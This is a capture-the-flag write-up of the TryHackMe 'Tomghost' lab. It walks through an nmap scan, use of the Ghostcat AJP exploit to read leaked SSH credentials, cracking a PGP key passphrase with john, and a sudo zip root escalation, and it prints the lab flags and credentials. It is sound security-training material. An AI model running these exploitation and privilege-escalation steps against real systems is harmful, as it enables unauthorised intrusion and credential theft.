# Tomghost

Starting with basic recon:
```sh
nmap -sV $ip -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 08:19 CEST
Nmap scan report for 10.10.46.67
Host is up (0.078s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got a few services running but I can instantly see an application running on Port `8080` named Tomcat. <br/>
So I would just make a quick browser search for known exploits. <br/>

![grafik](https://github.com/Aryt3/writeups/assets/110562298/8f316966-b846-4017-a809-1160fd813237)

Now I could take a look around the website and try to find something but there seem to be a lot of exploits for Tomcat. <br/>
So this leads me to https://www.exploit-db.com/exploits/48143. <br/>
Using the exploit:
```sh
python2 exploit.py 10.10.46.67 -p 8009 -f WEB-INF/web.xml
Getting resource at ajp13://10.10.46.67:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

After successfully retrieving user creds I try to login:
```sh
ssh skyfuck@$ip       
The authenticity of host '10.10.46.67 (10.10.46.67)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.46.67' (ED25519) to the list of known hosts.
skyfuck@10.10.46.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ whoami
skyfuck
```

Taking a look around:
```sh
skyfuck@ubuntu:~$ pwd
/home/skyfuck
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

After taking a closer look at those files I want to look around further.
```sh
skyfuck@ubuntu:~$ ls /home/
merlin  skyfuck
skyfuck@ubuntu:~$ ls /home/merlin
user.txt
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

Seems like we got our first flag. <br/>
The next thing would be to escalate priviledges.
```sh
skyfuck@ubuntu:~$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.
```

Now this didn't work, I could look around more but my guess is that I have to use the 2 files from earlier. <br/>
Copying the files to my local machine:
```sh
scp skyfuck@$ip:/home/skyfuck/* .                               
skyfuck@10.10.46.67's password: 
credential.pgp                                                                          100%  394     2.7KB/s   00:00    
tryhackme.asc                                                                           100% 5144    34.9KB/s   00:00
```

After some research I found a way to use john to bruteforce the .gpg file.
```sh
└─# gpg2john tryhackme.asc > abc.gpg

File tryhackme.asc
                                                                                                                    
└─# ls
abc.gpg  credential.pgp  tryhackme.asc

└─# cat abc.gpg       
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

└─# john --wordlist=Desktop/rockyou.txt abc.gpg            
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
No password hashes left to crack (see FAQ)

└─# john --show abc.gpg                        
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left

└─# gpg --import tryhackme.asc      
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(root㉿kali)-[/home/kali/tryhackme/tomghost]
└─# gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j   
```

Like this I was able to get the password for user merlin, so now I only need to switch to this user.
```sh
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ whoami
merlin
```

The only thing left now is priv esc so let's see what we got elevated permissions for.
```sh
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

So seeing we can execute the binary zip as root we can take a look at gtfobins. <br/>
Here we find several ways to exploit this binary: https://gtfobins.github.io/gtfobins/zip/.
```sh
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
```

Getting the last flag:
```sh
# cd /root/
# ls
root.txt  ufw
# cat root.txt  
THM{Z1P_1S_FAKE}
```
